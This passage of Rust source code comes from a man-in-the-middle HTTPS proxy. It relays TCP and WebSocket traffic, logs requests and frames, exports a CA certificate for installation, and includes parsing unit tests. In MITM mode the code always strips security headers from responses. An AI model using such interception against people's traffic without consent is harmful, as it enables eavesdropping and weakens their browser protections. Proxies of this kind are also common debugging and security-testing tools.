                                    &config.logger,
                                );
                            }
                        }

                        // Not a valid WebSocket upgrade, forward response anyway
                        client.write_all(resp_data)?;
                        continue;
                    }
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {}
                Err(e) => return Err(e.into()),
            }

            // Try to read from target
            match target.read(&mut target_buf) {
                Ok(0) => {
                    debug!("Target closed connection for {}", hostname);
                    break;
                }
                Ok(n) => {
                    let mut data_to_send = target_buf[..n].to_vec();

                    if let Some(mut resp) = HttpResponse::parse(&data_to_send) {
                        config
                            .logger
                            .log_response(hostname, resp.status_code, &resp.status_text);

                        // Always strip security headers in MITM mode
                        resp.strip_security_headers();
                        data_to_send = resp.to_bytes();
                    }

                    // Forward to client
                    client.write_all(&data_to_send)?;
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {}
                Err(e) => return Err(e.into()),
            }
        }

        Ok(())
    }

    /// Simple TCP relay (no TLS)
    fn relay_tcp(mut client: TcpStream, mut target: TcpStream) -> ProxyResult<()> {
        use std::thread;

        let mut client_clone = client.try_clone()?;
        let mut target_clone = target.try_clone()?;

        // Client -> Target
        let c2t = thread::spawn(move || {
            let mut buf = [0u8; 16384];
            loop {
                match client.read(&mut buf) {
                    Ok(0) => break,
                    Ok(n) => {
                        if target.write_all(&buf[..n]).is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        // Target -> Client
        let t2c = thread::spawn(move || {
            let mut buf = [0u8; 16384];
            loop {
                match target_clone.read(&mut buf) {
                    Ok(0) => break,
                    Ok(n) => {
                        if client_clone.write_all(&buf[..n]).is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        let _ = c2t.join();
        let _ = t2c.join();

        Ok(())
    }

    /// WebSocket passthrough relay (no inspection, bidirectional)
    ///
    /// After WebSocket upgrade, we just pass data through without parsing.
    /// This is used when a WebSocket connection is detected and upgraded.
    fn websocket_passthrough<S1, S2>(
        client: &mut S1,
        target: &mut S2,
        hostname: &str,
        logger: &TrafficLogger,
    ) -> ProxyResult<()>
    where
        S1: Read + Write,
        S2: Read + Write,
    {
        logger.log_info(&format!(
            "[{}] WebSocket: Entering passthrough mode",
            hostname
        ));

        let mut client_buf = [0u8; 65536];
        let mut target_buf = [0u8; 65536];
        let mut frame_count: u64 = 0;

        // Simple alternating read - not perfect but works for most cases
        // TODO: Use poll/select for better bidirectional handling
        loop {
            // Try to read from client (non-blocking would be better)
            match client.read(&mut client_buf) {
                Ok(0) => {
                    debug!("[{}] WebSocket: Client closed", hostname);
                    break;
                }
                Ok(n) => {
                    frame_count += 1;
                    let frame_type = Self::parse_ws_frame_type(&client_buf[..n]);
                    logger.log_ws_frame(hostname, "C->S", frame_count, frame_type, n);
                    target.write_all(&client_buf[..n])?;
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {}
                Err(e) => return Err(e.into()),
            }

            // Try to read from target
            match target.read(&mut target_buf) {
                Ok(0) => {
                    debug!("[{}] WebSocket: Target closed", hostname);
                    break;
                }
                Ok(n) => {
                    frame_count += 1;
                    let frame_type = Self::parse_ws_frame_type(&target_buf[..n]);
                    logger.log_ws_frame(hostname, "S->C", frame_count, frame_type, n);
                    client.write_all(&target_buf[..n])?;
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {}
                Err(e) => return Err(e.into()),
            }
        }

        logger.log_info(&format!(
            "[{}] WebSocket: Connection closed ({} frames)",
            hostname, frame_count
        ));
        Ok(())
    }

    /// Parse WebSocket frame opcode for logging
    fn parse_ws_frame_type(data: &[u8]) -> &'static str {
        if data.is_empty() {
            return "empty";
        }
        // WebSocket frame: first byte contains FIN + RSV + opcode (4 bits)
        let opcode = data[0] & 0x0F;
        match opcode {
            0x0 => "continuation",
            0x1 => "text",
            0x2 => "binary",
            0x8 => "close",
            0x9 => "ping",
            0xA => "pong",
            _ => "unknown",
        }
    }

    /// Export CA certificate for installation
    pub fn export_ca_pem(&self) -> String {
        self.config.ca.export_ca_pem()
    }

    /// Export CA certificate as DER
    pub fn export_ca_der(&self) -> Vec<u8> {
        self.config.ca.export_ca_der()
    }
}

/// Default interceptor that logs requests
pub struct LoggingInterceptor;

impl RequestInterceptor for LoggingInterceptor {
    fn on_request(&self, req: &mut HttpRequest, client_addr: Option<&str>) -> InterceptAction {
        let addr = client_addr.unwrap_or("?");
        info!(
            "[{}] >> {} {} (Host: {})",
            addr, req.method, req.path, req.host
        );
        InterceptAction::Continue
    }

    fn on_response(&self, req: &HttpRequest, resp: &mut HttpResponse) -> InterceptAction {
        info!(
            "<< {} {} {} ({})",
            req.host,
            resp.status_code,
            resp.status_text,
            resp.headers.get("content-type").unwrap_or(&"?".to_string())
        );
        InterceptAction::Continue
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_connect_target() {
        let request = "CONNECT example.com:443 HTTP/1.1\r\nHost: example.com:443\r\n\r\n";
        let target = MitmProxy::parse_connect_target(request).unwrap();
        assert_eq!(target.host(), "example.com");
        assert_eq!(target.port(), 443);
    }

    #[test]
    fn test_http_request_parse() {
        let data = b"GET /path HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Test\r\n\r\n";
        let req = HttpRequest::parse(data).unwrap();
        assert_eq!(req.method, "GET");
        assert_eq!(req.path, "/path");
        assert_eq!(req.host, "example.com");
    }

    #[test]
    fn test_http_response_parse() {
        let data = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html></html>";
        let resp = HttpResponse::parse(data).unwrap();
        assert_eq!(resp.status_code, 200);
        assert_eq!(resp.status_text, "OK");
    }

    #[test]
    fn test_websocket_upgrade_request_detection() {
        // Valid WebSocket upgrade request
        let data = b"GET /socket HTTP/1.1\r\n\
                     Host: example.com\r\n\
                     Connection: Upgrade\r\n\
                     Upgrade: websocket\r\n\
                     Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\
                     Sec-WebSocket-Version: 13\r\n\r\n";
        let req = HttpRequest::parse(data).unwrap();
        assert!(req.is_websocket_upgrade());

        // Regular GET request (not WebSocket)
        let data_regular = b"GET /path HTTP/1.1\r\nHost: example.com\r\n\r\n";
        let req_regular = HttpRequest::parse(data_regular).unwrap();
        assert!(!req_regular.is_websocket_upgrade());

        // Connection: Upgrade but not websocket
        let data_other = b"GET /h2 HTTP/1.1\r\n\
                          Host: example.com\r\n\
                          Connection: Upgrade\r\n\
                          Upgrade: h2c\r\n\r\n";
        let req_other = HttpRequest::parse(data_other).unwrap();
        assert!(!req_other.is_websocket_upgrade());
    }

    #[test]
    fn test_websocket_upgrade_response_detection() {
        // Valid WebSocket upgrade response (101 Switching Protocols)
        let data = b"HTTP/1.1 101 Switching Protocols\r\n\
                     Upgrade: websocket\r\n\
                     Connection: Upgrade\r\n\
                     Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\r\n\r\n";
        let resp = HttpResponse::parse(data).unwrap();
        assert!(resp.is_websocket_upgrade());
        assert_eq!(resp.status_code, 101);

        // Regular 200 OK response
        let data_regular = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n";
        let resp_regular = HttpResponse::parse(data_regular).unwrap();
        assert!(!resp_regular.is_websocket_upgrade());

        // 101 but not websocket
        let data_other = b"HTTP/1.1 101 Switching Protocols\r\n\
                          Upgrade: h2c\r\n\r\n";
        let resp_other = HttpResponse::parse(data_other).unwrap();
        assert!(!resp_other.is_websocket_upgrade());
    }

    #[test]
    fn test_parse_ws_frame_type() {
        // Text frame (opcode 0x1)
        assert_eq!(MitmProxy::parse_ws_frame_type(&[0x81, 0x05]), "text");
        // Binary frame (opcode 0x2)
        assert_eq!(MitmProxy::parse_ws_frame_type(&[0x82, 0x00]), "binary");
        // Close frame (opcode 0x8)
        assert_eq!(MitmProxy::parse_ws_frame_type(&[0x88, 0x02]), "close");
        // Ping frame (opcode 0x9)
        assert_eq!(MitmProxy::parse_ws_frame_type(&[0x89, 0x00]), "ping");
        // Pong frame (opcode 0xA)
        assert_eq!(MitmProxy::parse_ws_frame_type(&[0x8A, 0x00]), "pong");
        // Continuation frame (opcode 0x0)
        assert_eq!(
            MitmProxy::parse_ws_frame_type(&[0x00, 0x10]),
            "continuation"
        );
        // Empty data
        assert_eq!(MitmProxy::parse_ws_frame_type(&[]), "empty");
    }
}
